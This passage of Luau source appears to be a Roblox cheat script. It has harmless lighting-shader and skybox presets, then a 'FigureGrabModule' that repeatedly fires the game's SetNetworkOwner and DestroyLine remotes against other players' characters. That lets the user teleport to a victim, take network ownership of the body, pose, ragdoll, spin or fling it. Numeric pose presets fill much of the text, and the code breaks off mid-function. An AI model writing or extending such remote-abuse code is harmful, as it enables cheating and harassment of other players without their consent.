        Lighting.ColorShift_Top = Color3.fromRGB(240, 127, 14)
        Lighting.OutdoorAmbient = Color3.fromRGB(100, 50, 10)
        Lighting.ClockTime = 7
        Lighting.FogColor = Color3.fromRGB(100, 55, 20)
        Lighting.FogEnd = 1000
        Lighting.ExposureCompensation = 0.5
        Lighting.Ambient = Color3.fromRGB(80, 40, 10)
    elseif shaderType == 'Arctic' then
        local cc = Instance.new('ColorCorrectionEffect', Lighting)

        cc.Saturation = -0.3
        cc.Contrast = 0.2
        cc.TintColor = Color3.fromRGB(220, 240, 255)

        local bloom = Instance.new('BloomEffect', Lighting)

        bloom.Intensity = 0.8
        bloom.Size = 24
        bloom.Threshold = 0.6

        local atmos = Instance.new('Atmosphere', Lighting)

        atmos.Density = 0.45
        atmos.Color = Color3.fromRGB(180, 200, 255)
        atmos.Decay = Color3.fromRGB(255, 255, 255)
        atmos.Glare = 0.6
        Lighting.Ambient = Color3.fromRGB(0, 50, 100)
        Lighting.OutdoorAmbient = Color3.fromRGB(150, 170, 200)
        Lighting.GlobalShadows = true
    end
end
function ResetShaders()
    for _, child in pairs(Lighting:GetChildren())do
        if child:IsA('PostEffect') or child:IsA('Sky') or child:IsA('Atmosphere') then
            child:Destroy()
        end
    end

    Lighting.Brightness = originalLighting.Brightness
    Lighting.ExposureCompensation = 0
    Lighting.ClockTime = 14
    Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
    Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
    Lighting.OutdoorAmbient = originalLighting.OutdoorAmbient
    Lighting.FogColor = Color3.fromRGB(192, 192, 192)
    Lighting.FogEnd = 100000
    Lighting.FogStart = 0
    Lighting.ShadowSoftness = 0
    Lighting.Ambient = originalLighting.Ambient
    Lighting.GlobalShadows = originalLighting.GlobalShadows
end

PostFxBox:AddCheckbox('ShaderMasterToggle', {
    Text = 'Enable Shader',
    Default = false,
})
Toggles.ShaderMasterToggle:OnChanged(function(v)
    ShaderState.active = v

    if v then
        if ShaderState.selected ~= '' then
            ApplyShader(ShaderState.selected)
            Notify('<b>UNSTABLE</b>', 'Shader applied: ' .. ShaderState.selected, 3)
        else
            Notify('<b>UNSTABLE</b>', 'Select a shader preset first.', 3)
        end
    else
        ResetShaders()
        Notify('<b>UNSTABLE</b>', 'Shaders reset.', 3)
    end
end)

local ShaderDepBox = PostFxBox:AddDependencyGroupbox()

ShaderDepBox:AddDropdown('ShaderPresetDrop', {
    Values = {
        'Classic',
        'Twilight',
        'Luminous',
        'Sandstorm',
        'Arctic',
    },
    Default = 'Classic',
    Multi = false,
    Text = 'Preset',
})
ShaderDepBox:SetupDependencies({
    {
        Toggles.ShaderMasterToggle,
        true,
    },
})
Options.ShaderPresetDrop:OnChanged(function(v)
    ShaderState.selected = v

    if ShaderState.active then
        ApplyShader(v)
    end
end)

SkyBox = Tabs.ESP:AddRightGroupbox('Sky', 'cloud')
Skyboxes = {
    ['Arctic Horizon'] = {
        Bk = 'http://www.roblox.com/asset/?id=225469390',
        Dn = 'http://www.roblox.com/asset/?id=225469395',
        Ft = 'http://www.roblox.com/asset/?id=225469403',
        Lf = 'http://www.roblox.com/asset/?id=225469450',
        Rt = 'http://www.roblox.com/asset/?id=225469471',
        Up = 'http://www.roblox.com/asset/?id=225469481',
    },
    ['Black Tempest'] = {
        Bk = 'rbxassetid://15502511288',
        Dn = 'rbxassetid://15502508460',
        Ft = 'rbxassetid://15502510289',
        Lf = 'rbxassetid://15502507918',
        Rt = 'rbxassetid://15502509398',
        Up = 'rbxassetid://15502511911',
    },
    ['Blossom Morning'] = {
        Bk = 'http://www.roblox.com/asset/?id=271042516',
        Dn = 'http://www.roblox.com/asset/?id=271077243',
        Ft = 'http://www.roblox.com/asset/?id=271042556',
        Lf = 'http://www.roblox.com/asset/?id=271042310',
        Rt = 'http://www.roblox.com/asset/?id=271042467',
        Up = 'http://www.roblox.com/asset/?id=271077958',
    },
    ['Blue Cosmos'] = {
        Bk = 'rbxassetid://15536110634',
        Dn = 'rbxassetid://15536112543',
        Ft = 'rbxassetid://15536116141',
        Lf = 'rbxassetid://15536114370',
        Rt = 'rbxassetid://15536118762',
        Up = 'rbxassetid://15536117282',
    },
    ['Blue Nebula'] = {
        Bk = 'http://www.roblox.com/asset?id=135207744',
        Dn = 'http://www.roblox.com/asset?id=135207662',
        Ft = 'http://www.roblox.com/asset?id=135207770',
        Lf = 'http://www.roblox.com/asset?id=135207615',
        Rt = 'http://www.roblox.com/asset?id=135207695',
        Up = 'http://www.roblox.com/asset?id=135207794',
    },
    ['Blue Planet'] = {
        Bk = 'rbxassetid://218955819',
        Dn = 'rbxassetid://218953419',
        Ft = 'rbxassetid://218954524',
        Lf = 'rbxassetid://218958493',
        Rt = 'rbxassetid://218957134',
        Up = 'rbxassetid://218950090',
    },
    ['Midnight Blue'] = {
        Bk = 'http://www.roblox.com/asset/?id=12064107',
        Dn = 'http://www.roblox.com/asset/?id=12064152',
        Ft = 'http://www.roblox.com/asset/?id=12064121',
        Lf = 'http://www.roblox.com/asset/?id=12063984',
        Rt = 'http://www.roblox.com/asset/?id=12064115',
        Up = 'http://www.roblox.com/asset/?id=12064131',
    },
    ['Stormfront Rain'] = {
        Bk = 'http://www.roblox.com/asset/?id=4498828382',
        Dn = 'http://www.roblox.com/asset/?id=4498828812',
        Ft = 'http://www.roblox.com/asset/?id=4498829917',
        Lf = 'http://www.roblox.com/asset/?id=4498830911',
        Rt = 'http://www.roblox.com/asset/?id=4498830417',
        Up = 'http://www.roblox.com/asset/?id=4498831746',
    },
    ['Dark Rainstorm'] = {
        Bk = 'http://www.roblox.com/asset/?id=149679669',
        Dn = 'http://www.roblox.com/asset/?id=149681979',
        Ft = 'http://www.roblox.com/asset/?id=149679690',
        Lf = 'http://www.roblox.com/asset/?id=149679709',
        Rt = 'http://www.roblox.com/asset/?id=149679722',
        Up = 'http://www.roblox.com/asset/?id=149680199',
    },
    ['Cosmic Rift'] = {
        Bk = 'http://www.roblox.com/asset/?id=149397692',
        Dn = 'http://www.roblox.com/asset/?id=149397686',
        Ft = 'http://www.roblox.com/asset/?id=149397697',
        Lf = 'http://www.roblox.com/asset/?id=149397684',
        Rt = 'http://www.roblox.com/asset/?id=149397688',
        Up = 'http://www.roblox.com/asset/?id=149397702',
    },
    ['Celestial Abyss'] = {
        Bk = 'http://www.roblox.com/asset/?id=159248188',
        Dn = 'http://www.roblox.com/asset/?id=159248183',
        Ft = 'http://www.roblox.com/asset/?id=159248187',
        Lf = 'http://www.roblox.com/asset/?id=159248173',
        Rt = 'http://www.roblox.com/asset/?id=159248192',
        Up = 'http://www.roblox.com/asset/?id=159248176',
    },
    ['Galaxy Core'] = {
        Bk = 'rbxassetid://15983968922',
        Dn = 'rbxassetid://15983966825',
        Ft = 'rbxassetid://15983965025',
        Lf = 'rbxassetid://15983967420',
        Rt = 'rbxassetid://15983966246',
        Up = 'rbxassetid://15983964246',
    },
    ['Ultra HD'] = {
        Bk = 'http://www.roblox.com/asset/?id=16553658937',
        Dn = 'http://www.roblox.com/asset/?id=16553660713',
        Ft = 'http://www.roblox.com/asset/?id=16553662144',
        Lf = 'http://www.roblox.com/asset/?id=16553664042',
        Rt = 'http://www.roblox.com/asset/?id=16553665766',
        Up = 'http://www.roblox.com/asset/?id=16553667750',
    },
    ['Pixel Craft'] = {
        Bk = 'rbxassetid://8735166756',
        Dn = 'http://www.roblox.com/asset/?id=8735166707',
        Ft = 'http://www.roblox.com/asset/?id=8735231668',
        Lf = 'http://www.roblox.com/asset/?id=8735166755',
        Rt = 'http://www.roblox.com/asset/?id=8735166751',
        Up = 'http://www.roblox.com/asset/?id=8735166729',
    },
    ['Cotton Candy'] = {
        Bk = 'rbxassetid://12216109205',
        Dn = 'rbxassetid://12216109875',
        Ft = 'rbxassetid://12216109489',
        Lf = 'rbxassetid://12216110170',
        Rt = 'rbxassetid://12216110471',
        Up = 'rbxassetid://12216108877',
    },
    ['Pink Horizon'] = {
        Bk = 'http://www.roblox.com/asset/?id=151165214',
        Dn = 'http://www.roblox.com/asset/?id=151165197',
        Ft = 'http://www.roblox.com/asset/?id=151165224',
        Lf = 'http://www.roblox.com/asset/?id=151165191',
        Rt = 'http://www.roblox.com/asset/?id=151165206',
        Up = 'http://www.roblox.com/asset/?id=151165227',
    },
    ['Amethyst Dusk'] = {
        Bk = 'rbxassetid://264908339',
        Dn = 'rbxassetid://264907909',
        Ft = 'rbxassetid://264909420',
        Lf = 'rbxassetid://264909758',
        Rt = 'rbxassetid://264908886',
        Up = 'rbxassetid://264907379',
    },
    ['Crimson Night'] = {
        Bk = 'http://www.roblox.com/asset/?id=401664839',
        Dn = 'http://www.roblox.com/asset/?id=401664862',
        Ft = 'http://www.roblox.com/asset/?id=401664960',
        Lf = 'http://www.roblox.com/asset/?id=401664881',
        Rt = 'http://www.roblox.com/asset/?id=401664901',
        Up = 'http://www.roblox.com/asset/?id=401664936',
    },
    ['True Vision'] = {
        Bk = 'rbxassetid://653719502',
        Dn = 'rbxassetid://653718790',
        Ft = 'rbxassetid://653719067',
        Lf = 'rbxassetid://653719190',
        Rt = 'rbxassetid://653718931',
        Up = 'rbxassetid://653719321',
    },
    ['Default Roblox'] = {
        Bk = 'rbxasset://textures/sky/sky512_bk.tex',
        Dn = 'rbxasset://textures/sky/sky512_dn.tex',
        Ft = 'rbxasset://textures/sky/sky512_ft.tex',
        Lf = 'rbxasset://textures/sky/sky512_lf.tex',
        Rt = 'rbxasset://textures/sky/sky512_rt.tex',
        Up = 'rbxasset://textures/sky/sky512_up.tex',
    },
    ['Outer Space'] = {
        Bk = 'http://www.roblox.com/asset/?id=166509999',
        Dn = 'http://www.roblox.com/asset/?id=166510057',
        Ft = 'http://www.roblox.com/asset/?id=166510116',
        Lf = 'http://www.roblox.com/asset/?id=166510092',
        Rt = 'http://www.roblox.com/asset/?id=166510131',
        Up = 'http://www.roblox.com/asset/?id=166510114',
    },
    ['Summer Glow'] = {
        Bk = 'rbxassetid://16648590964',
        Dn = 'rbxassetid://16648617436',
        Ft = 'rbxassetid://16648595424',
        Lf = 'rbxassetid://16648566370',
        Rt = 'rbxassetid://16648577071',
        Up = 'rbxassetid://16648598180',
    },
    ['Stylized Dream'] = {
        Bk = 'rbxassetid://18351376859',
        Dn = 'rbxassetid://18351374919',
        Ft = 'rbxassetid://18351376800',
        Lf = 'rbxassetid://18351376469',
        Rt = 'rbxassetid://18351376457',
        Up = 'rbxassetid://18351377189',
    },
    ['Golden Sunset'] = {
        Bk = 'rbxassetid://600830446',
        Dn = 'rbxassetid://600831635',
        Ft = 'rbxassetid://600832720',
        Lf = 'rbxassetid://600886090',
        Rt = 'rbxassetid://600833862',
        Up = 'rbxassetid://600835177',
    },
    Thunderhead = {
        Bk = 'http://www.roblox.com/asset/?id=18703245834',
        Dn = 'http://www.roblox.com/asset/?id=18703243349',
        Ft = 'http://www.roblox.com/asset/?id=18703240532',
        Lf = 'http://www.roblox.com/asset/?id=18703237556',
        Rt = 'http://www.roblox.com/asset/?id=18703235430',
        Up = 'http://www.roblox.com/asset/?id=18703232671',
    },
    ['Winter Frost'] = {
        Bk = 'http://www.roblox.com/asset/?id=155657655',
        Dn = 'http://www.roblox.com/asset/?id=155674246',
        Ft = 'http://www.roblox.com/asset/?id=155657609',
        Lf = 'http://www.roblox.com/asset/?id=155657671',
        Rt = 'http://www.roblox.com/asset/?id=155657619',
        Up = 'http://www.roblox.com/asset/?id=155674931',
    },
}
ActiveSky = nil

function applySkybox()
    local skyData = Skyboxes[Options.SkyPicker.Value]

    if not skyData then
        return
    end
    if ActiveSky then
        ActiveSky:Destroy()

        ActiveSky = nil
    end

    local sky = Instance.new('Sky')

    sky.Name = 'PhantomSky'
    sky.SkyboxBk = skyData.Bk
    sky.SkyboxDn = skyData.Dn
    sky.SkyboxFt = skyData.Ft
    sky.SkyboxLf = skyData.Lf
    sky.SkyboxRt = skyData.Rt
    sky.SkyboxUp = skyData.Up
    sky.Parent = Lighting
    ActiveSky = sky
end

SkyBox:AddCheckbox('SkyActiveToggle', {
    Text = 'Apply Skybox',
    Default = false,
})
Toggles.SkyActiveToggle:OnChanged(function(v)
    if v then
        applySkybox()
    else
        if ActiveSky then
            ActiveSky:Destroy()

            ActiveSky = nil
        end
    end
end)

local SkyDepBox = SkyBox:AddDependencyGroupbox()

SkyDepBox:AddDropdown('SkyPicker', {
    Text = 'Skybox Changer',
    Values = table.create(0),
    Default = 'Arctic Horizon',
})

do
    local values = {}

    for name in pairs(Skyboxes)do
        table.insert(values, name)
    end

    table.sort(values)
    Options.SkyPicker:SetValues(values)
end

SkyDepBox:SetupDependencies({
    {
        Toggles.SkyActiveToggle,
        true,
    },
})
Options.SkyPicker:OnChanged(function()
    if Toggles.SkyActiveToggle.Value then
        applySkybox()
    end
end)

getgenv().FigureGrabModule = {}
FGM = FigureGrabModule
FGM.Players = game:GetService('Players')
FGM.RunService = game:GetService('RunService')
FGM.ReplicatedStorage = game:GetService('ReplicatedStorage')
FGM.UserInputService = game:GetService('UserInputService')
FGM.Workspace = game:GetService('Workspace')
FGM.TweenService = game:GetService('TweenService')
FGM.LocalPlayer = FGM.Players.LocalPlayer
FGM.Mouse = FGM.LocalPlayer:GetMouse()

local _grabFolder = FGM.ReplicatedStorage:WaitForChild('GrabEvents', 10)

FGM.GrabEvents = _grabFolder
FGM.SetNetworkOwner = _grabFolder and _grabFolder:WaitForChild('SetNetworkOwner', 5) or nil
FGM.DestroyLine = _grabFolder and _grabFolder:WaitForChild('DestroyLine', 5) or nil

function _FireSetNetworkOwner(part, cf)
    if FGM.SetNetworkOwner and part and part.Parent then
        pcall(function()
            FGM.SetNetworkOwner:FireServer(part, cf)
        end)
    end
end
function _FireDestroyLine(part)
    if FGM.DestroyLine and part and part.Parent then
        pcall(function()
            FGM.DestroyLine:FireServer(part)
        end)
    end
end

FGM.State = {
    FigureGrabEnabled = false,
    FigureGrabConnection = nil,
    TargetCharacter = nil,
    TargetPlayer = nil,
    AnimationCopyEnabled = false,
    VectorZero = Vector3.new(0, 0, 0),
    PalletForRagdoll = nil,
    RagdollConnections = {},
    LoopRagdollEnabled = false,
    RespawnConnection = nil,
    RejoinConnection = nil,
    SmoothedCFrames = {},
    SelectedLimb = 'Torso',
    AutoGrabActive = false,
    AutoGrabConnection = nil,
    LastGrabTargetRef = nil,
    DistanceTPInProgress = false,
    FreezeLimbsEnabled = false,
    FrozenCFrames = {},
    VelSuppressEnabled = false,
    GravityFlipEnabled = false,
    LockRotationEnabled = false,
    LockedRotation = CFrame.identity,
    ForceLookAtEnabled = false,
    ForceUprightEnabled = false,
    FlingOnReleaseEnabled = false,
    FlingForce = 300,
    HoldAtCameraEnabled = false,
    OscillateEnabled = false,
    OscillateSpeed = 2,
    OscillateAmount = 3,
    OscillateTimer = 0,
    SpinEnabled = false,
    SpinSpeed = 180,
    SpinAngle = 0,
    ActiveNetworkTarget = nil,
    HighlightedLimb = nil,
    LimbHighlight = nil,
    PersistentGrabActive = false,
    PersistentGrabThread = nil,
}
FGM.Configuration = {
    DampingEnabled = true,
    DampingSpeed = 12,
    SnapEnabled = false,
    SnapPosStep = 0.5,
    SnapRotStep = 15,
    LineDistance = 0,
    AutoTPDistance = 40,
    HoldPosition = {
        X = 0,
        Y = 0,
        Z = -5,
    },
    HoldRotation = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    LeftArmPosition = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    LeftArmRotation = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    RightArmPosition = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    RightArmRotation = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    LeftLegPosition = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    LeftLegRotation = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    RightLegPosition = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    RightLegRotation = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    HeadPosition = {
        X = 0,
        Y = 0,
        Z = 0,
    },
    HeadRotation = {
        X = 0,
        Y = 0,
        Z = 0,
    },
}
FGM.Presets = {
    Pose1 = {
        HoldPosition = {
            X = 0,
            Y = 0,
            Z = -7.5,
        },
        HoldRotation = {
            X = 90,
            Y = 0,
            Z = 108,
        },
        LeftArmPosition = {
            X = -1.5,
            Y = 1,
            Z = -1,
        },
        LeftArmRotation = {
            X = 283,
            Y = 0,
            Z = 0,
        },
        RightArmPosition = {
            X = 1.5,
            Y = 0.5,
            Z = 1,
        },
        RightArmRotation = {
            X = 270,
            Y = 0,
            Z = 0,
        },
        LeftLegPosition = {
            X = 0.5,
            Y = -1.5,
            Z = 0.5,
        },
        LeftLegRotation = {
            X = 312,
            Y = 0,
            Z = 0,
        },
        RightLegPosition = {
            X = -0.5,
            Y = -1.5,
            Z = 0.5,
        },
        RightLegRotation = {
            X = 283,
            Y = 0,
            Z = 0,
        },
        HeadPosition = {
            X = 0,
            Y = 1.5,
            Z = 0,
        },
        HeadRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
    },
    Pose2 = {
        HoldPosition = {
            X = 0,
            Y = -1.5,
            Z = -12.5,
        },
        HoldRotation = {
            X = 272,
            Y = 0,
            Z = 0,
        },
        LeftArmPosition = {
            X = -1,
            Y = 1,
            Z = -0.5,
        },
        LeftArmRotation = {
            X = 90,
            Y = 0,
            Z = 0,
        },
        RightArmPosition = {
            X = 1,
            Y = 1,
            Z = -0.5,
        },
        RightArmRotation = {
            X = 90,
            Y = 0,
            Z = 0,
        },
        LeftLegPosition = {
            X = 1,
            Y = -1,
            Z = -0.5,
        },
        LeftLegRotation = {
            X = 90,
            Y = 0,
            Z = 0,
        },
        RightLegPosition = {
            X = -1,
            Y = -1,
            Z = -0.5,
        },
        RightLegRotation = {
            X = 90,
            Y = 0,
            Z = 0,
        },
        HeadPosition = {
            X = 0,
            Y = 1,
            Z = 1,
        },
        HeadRotation = {
            X = 90,
            Y = 0,
            Z = 0,
        },
    },
    Pose3 = {
        HoldPosition = {
            X = 0,
            Y = -5.5,
            Z = -4,
        },
        HoldRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        LeftArmPosition = {
            X = 1,
            Y = 7.5,
            Z = 1.5,
        },
        LeftArmRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        RightArmPosition = {
            X = 1,
            Y = 6,
            Z = 1.5,
        },
        RightArmRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        LeftLegPosition = {
            X = 0.5,
            Y = 5,
            Z = 1.5,
        },
        LeftLegRotation = {
            X = 0,
            Y = 0,
            Z = 92,
        },
        RightLegPosition = {
            X = -0.5,
            Y = 5,
            Z = 1.5,
        },
        RightLegRotation = {
            X = 0,
            Y = 0,
            Z = 90,
        },
        HeadPosition = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        HeadRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
    },
    Pose4 = {
        HoldPosition = {
            X = 1.5,
            Y = -8.5,
            Z = -1.5,
        },
        HoldRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        LeftArmPosition = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        LeftArmRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        RightArmPosition = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        RightArmRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        LeftLegPosition = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        LeftLegRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        RightLegPosition = {
            X = 1.5,
            Y = 0,
            Z = 0,
        },
        RightLegRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        HeadPosition = {
            X = 0,
            Y = 9,
            Z = 0,
        },
        HeadRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
    },
    Pose5 = {
        HoldPosition = {
            X = 0,
            Y = -3,
            Z = -6,
        },
        HoldRotation = {
            X = 270,
            Y = 0,
            Z = 0,
        },
        LeftArmPosition = {
            X = -1,
            Y = 0.5,
            Z = 0,
        },
        LeftArmRotation = {
            X = 180,
            Y = 0,
            Z = 0,
        },
        RightArmPosition = {
            X = 1,
            Y = 0.5,
            Z = 0,
        },
        RightArmRotation = {
            X = 180,
            Y = 0,
            Z = 0,
        },
        LeftLegPosition = {
            X = 0,
            Y = -3,
            Z = 0,
        },
        LeftLegRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
        RightLegPosition = {
            X = 0,
            Y = -2,
            Z = 0.5,
        },
        RightLegRotation = {
            X = 45,
            Y = 0,
            Z = 0,
        },
        HeadPosition = {
            X = 0,
            Y = 1.5,
            Z = -0.5,
        },
        HeadRotation = {
            X = 270,
            Y = 0,
            Z = 0,
        },
    },
    Pose6 = {
        HoldPosition = {
            X = 5.5,
            Y = 0.5,
            Z = -1.5,
        },
        HoldRotation = {
            X = 345,
            Y = 39,
            Z = 0,
        },
        LeftArmPosition = {
            X = 2,
            Y = 0.5,
            Z = 0,
        },
        LeftArmRotation = {
            X = 0,
            Y = 43,
            Z = 121,
        },
        RightArmPosition = {
            X = -2,
            Y = 0,
            Z = -0,
        },
        RightArmRotation = {
            X = 64,
            Y = 112,
            Z = 0,
        },
        LeftLegPosition = {
            X = -0.5,
            Y = -2,
            Z = 0,
        },
        LeftLegRotation = {
            X = 349,
            Y = 0,
            Z = 360,
        },
        RightLegPosition = {
            X = 0.5,
            Y = -2,
            Z = 0,
        },
        RightLegRotation = {
            X = 345,
            Y = 360,
            Z = 10,
        },
        HeadPosition = {
            X = 0,
            Y = 1.5,
            Z = 0,
        },
        HeadRotation = {
            X = 0,
            Y = 344,
            Z = 0,
        },
    },
    Pose7 = {
        HoldPosition = {
            X = 0,
            Y = -2,
            Z = -10,
        },
        HoldRotation = {
            X = 90,
            Y = 0,
            Z = 0,
        },
        LeftArmPosition = {
            X = -1.5,
            Y = 0,
            Z = 0,
        },
        LeftArmRotation = {
            X = 270,
            Y = 0,
            Z = 315,
        },
        RightArmPosition = {
            X = 1.5,
            Y = 0,
            Z = 0,
        },
        RightArmRotation = {
            X = 270,
            Y = 0,
            Z = 45,
        },
        LeftLegPosition = {
            X = -1,
            Y = -1.5,
            Z = 0,
        },
        LeftLegRotation = {
            X = 90,
            Y = 0,
            Z = 0,
        },
        RightLegPosition = {
            X = 1,
            Y = -1.5,
            Z = 0,
        },
        RightLegRotation = {
            X = 90,
            Y = 0,
            Z = 0,
        },
        HeadPosition = {
            X = 0,
            Y = 1.5,
            Z = 0,
        },
        HeadRotation = {
            X = 0,
            Y = 0,
            Z = 0,
        },
    },
    JojoStand = {
        HoldPosition = {
            X = -4.5,
            Y = 0.5,
            Z = -1.5,
        },
        HoldRotation = {
            X = 8,
            Y = 349,
            Z = 0,
        },
        LeftArmPosition = {
            X = 1.5,
            Y = 0,
            Z = -0,
        },
        LeftArmRotation = {
            X = 15,
            Y = 62,
            Z = 41,
        },
        RightArmPosition = {
            X = -1.5,
            Y = 0.5,
            Z = -0.5,
        },
        RightArmRotation = {
            X = 65,
            Y = 149,
            Z = 6,
        },
        LeftLegPosition = {
            X = -0.5,
            Y = -2,
            Z = 0,
        },
        LeftLegRotation = {
            X = 349,
            Y = 0,
            Z = 360,
        },
        RightLegPosition = {
            X = 0.5,
            Y = -2,
            Z = 0,
        },
        RightLegRotation = {
            X = 345,
            Y = 360,
            Z = 10,
        },
        HeadPosition = {
            X = 0,
            Y = 1.5,
            Z = 0,
        },
        HeadRotation = {
            X = 0,
            Y = 344,
            Z = 0,
        },
    },
}
FGM.CustomPresets = {}

local LIMB_OPTIONS = {
    'Torso',
    'Head',
    'Left Arm',
    'Right Arm',
    'Left Leg',
    'Right Leg',
}
local LIMB_SECTION_MAP = {
    Torso = {
        pos = 'HoldPosition',
        rot = 'HoldRotation',
    },
    Head = {
        pos = 'HeadPosition',
        rot = 'HeadRotation',
    },
    ['Left Arm'] = {
        pos = 'LeftArmPosition',
        rot = 'LeftArmRotation',
    },
    ['Right Arm'] = {
        pos = 'RightArmPosition',
        rot = 'RightArmRotation',
    },
    ['Left Leg'] = {
        pos = 'LeftLegPosition',
        rot = 'LeftLegRotation',
    },
    ['Right Leg'] = {
        pos = 'RightLegPosition',
        rot = 'RightLegRotation',
    },
}
local PART_NAME_MAP = {
    Torso = 'Torso',
    Head = 'Head',
    ['Left Arm'] = 'Left Arm',
    ['Right Arm'] = 'Right Arm',
    ['Left Leg'] = 'Left Leg',
    ['Right Leg'] = 'Right Leg',
}

function SnapValue(value, step)
    if step == 0 then
        return value
    end

    return math.round(value / step) * step
end
function FGM.ApplySnap(section, axis, value)
    if not FGM.Configuration.SnapEnabled then
        return value
    end

    local isRot = section:find('Rotation')
    local step = isRot and FGM.Configuration.SnapRotStep or FGM.Configuration.SnapPosStep

    return SnapValue(value, step)
end
function BuildTargetCFrame(partName, torsoWorldCFrame, config)
    local posKey, rotKey

    if partName == 'Left Arm' then
        posKey, rotKey = 'LeftArmPosition', 'LeftArmRotation'
    elseif partName == 'Right Arm' then
        posKey, rotKey = 'RightArmPosition', 'RightArmRotation'
    elseif partName == 'Left Leg' then
        posKey, rotKey = 'LeftLegPosition', 'LeftLegRotation'
    elseif partName == 'Right Leg' then
        posKey, rotKey = 'RightLegPosition', 'RightLegRotation'
    elseif partName == 'Head' then
        posKey, rotKey = 'HeadPosition', 'HeadRotation'
    else
        return nil
    end

    local p = config[posKey]
    local r = config[rotKey]

    if not p or not r then
        return nil
    end

    return torsoWorldCFrame * CFrame.new(p.X, p.Y, p.Z) * CFrame.Angles(math.rad(r.X), math.rad(r.Y), math.rad(r.Z))
end
function LerpCFrame(a, b, alpha)
    return a:Lerp(b, alpha)
end
function FGM.GetCharacter(player)
    local character = player.Character

    if not character then
        character = player.CharacterAdded:Wait()
    end

    return character
end
function InitSmoothedCFrames(targetCharacter)
    FGM.State.SmoothedCFrames = {}

    local parts = {
        'Torso',
        'Head',
        'Left Arm',
        'Right Arm',
        'Left Leg',
        'Right Leg',
    }

    for _, name in ipairs(parts)do
        local part = targetCharacter:FindFirstChild(name)

        if part then
            FGM.State.SmoothedCFrames[name] = part.CFrame
        end
    end
end
function SetupBodyParts(targetCharacter)
    local bodyParts = {
        'Head',
        'Left Arm',
        'Right Arm',
        'Left Leg',
        'Right Leg',
    }

    for _, partName in pairs(bodyParts)do
        local part = targetCharacter:FindFirstChild(partName)

        if part then
            part.Anchored = false
            part.CanCollide = true
            part.Massless = true
        end
    end

    InitSmoothedCFrames(targetCharacter)
end
function FGM.ClearLimbHighlight()
    local state = FGM.State

    if state.LimbHighlight and state.LimbHighlight.Parent then
        state.LimbHighlight:Destroy()
    end

    state.LimbHighlight = nil
    state.HighlightedLimb = nil
end
function FGM.ApplyLimbHighlight(limbName)
    FGM.ClearLimbHighlight()

    local state = FGM.State
    local target = state.TargetCharacter

    if not target then
        return
    end

    local partName = PART_NAME_MAP[limbName]

    if not partName then
        return
    end

    local part = target:FindFirstChild(partName)

    if not part then
        return
    end

    local highlight = Instance.new('SelectionBox')

    highlight.Adornee = part
    highlight.Color3 = Color3.fromRGB(0, 120, 255)
    highlight.LineThickness = 0.05
    highlight.SurfaceTransparency = 0.6
    highlight.SurfaceColor3 = Color3.fromRGB(0, 100, 255)
    highlight.Parent = FGM.Workspace.CurrentCamera
    state.LimbHighlight = highlight
    state.HighlightedLimb = limbName
end
function FGM.ExecuteGrabTP(targetChar)
    local state = FGM.State
    local myChar = FGM.GetCharacter(FGM.LocalPlayer)

    if not myChar then
        return false
    end

    local myHRP = myChar:FindFirstChild('HumanoidRootPart')
    local targetHRP = targetChar and targetChar:FindFirstChild('HumanoidRootPart')

    if not myHRP or not targetHRP then
        return false
    end
    if targetChar.Parent ~= FGM.Workspace then
        return false
    end

    local savedPos = myHRP.CFrame
    local cam = FGM.Workspace.CurrentCamera
    local oldCamType = cam.CameraType
    local oldCamSubject = cam.CameraSubject

    for _ = 1, 5 do
        _FireDestroyLine(targetHRP)
        FGM.RunService.RenderStepped:Wait()
        _FireSetNetworkOwner(targetHRP, targetHRP.CFrame)
    end

    cam.CameraType = Enum.CameraType.Scriptable
    cam.CFrame = cam.CFrame

    local dist = (targetHRP.Position - myHRP.Position).Magnitude

    if dist >= 5 then
        tp(myHRP, targetHRP)
        task.wait(0.2)
        pcall(function()
            sno(targetHRP)
        end)
        task.wait(0.05)

        myHRP.AssemblyLinearVelocity = Vector3.zero
        myHRP.AssemblyAngularVelocity = Vector3.zero
        targetHRP.AssemblyLinearVelocity = Vector3.zero
        targetHRP.AssemblyAngularVelocity = Vector3.zero
        myHRP.CFrame = savedPos

        task.wait(0.2)
    end

    for _, v in pairs(targetChar:GetChildren())do
        if v:IsA('BasePart') then
            pcall(function()
                v.AssemblyLinearVelocity = Vector3.zero
                v.AssemblyAngularVelocity = Vector3.zero
            end)
        end
    end

    local cfg = FGM.Configuration
    local holdCF = myHRP.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, cfg.HoldPosition.Z) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))
    local torso = targetChar:FindFirstChild('Torso')

    if torso then
        pcall(function()
            torso.CFrame = holdCF
            torso.AssemblyLinearVelocity = Vector3.zero
            torso.AssemblyAngularVelocity = Vector3.zero
        end)
    end

    cam.CameraType = oldCamType

    if oldCamSubject and typeof(oldCamSubject) == 'Instance' and oldCamSubject.Parent then
        cam.CameraSubject = oldCamSubject
    end

    state.ActiveNetworkTarget = targetHRP

    return true
end
function FGM.StartPersistentGrab()
    FGM.StopPersistentGrab()

